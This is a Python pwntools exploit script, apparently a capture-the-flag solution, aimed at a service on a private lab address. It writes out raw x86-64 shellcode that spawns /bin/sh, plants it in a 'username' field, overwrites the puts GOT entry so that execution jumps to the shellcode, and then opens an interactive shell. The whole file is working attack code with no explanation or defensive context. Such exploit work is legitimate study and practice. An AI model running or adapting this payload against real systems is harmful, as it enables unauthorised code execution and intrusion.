#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

host = "10.211.55.6"
port = 8888

context.arch = "amd64"    
r = remote(host,port)

sc = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"  #execve("/bin/sh",NULL,NULL)
username = "\x00" + sc 
r.recvuntil(":")
r.sendline(username)
r.recvuntil(":")
puts_got = 0x601020
r.sendline(hex(puts_got))
r.recvuntil(":")
addr_username = 0x6010a0
r.send(p64(addr_username+1))
r.interactive()
